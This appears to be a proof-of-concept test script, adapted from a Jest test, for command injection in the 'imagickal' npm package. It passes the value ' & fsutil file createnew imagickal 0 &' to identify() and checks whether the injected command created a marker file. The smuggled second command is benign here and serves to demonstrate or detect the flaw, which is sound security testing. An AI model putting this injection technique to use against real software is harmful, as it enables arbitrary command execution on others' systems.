// test("Remote fsutil file createnew execution 0 in imagickal", () => {
//   expect.assertions(2);
  const im = require("imagickal");
  const fs = require("fs");
  const path = "./imagickal";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
//       console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
console.log("{ " + file_exist + ", " + false + " }");
  console.log(im
    .identify(" & fsutil file createnew imagickal 0 &")
    .catch((err) => {})
    .finally(() => {
//       console.log("finally!");
      file_exist = fs.existsSync(path);
console.log("{ " + file_exist + ", " + true + " }");
      fs.unlink(path, function (err) {});
    }));
// });
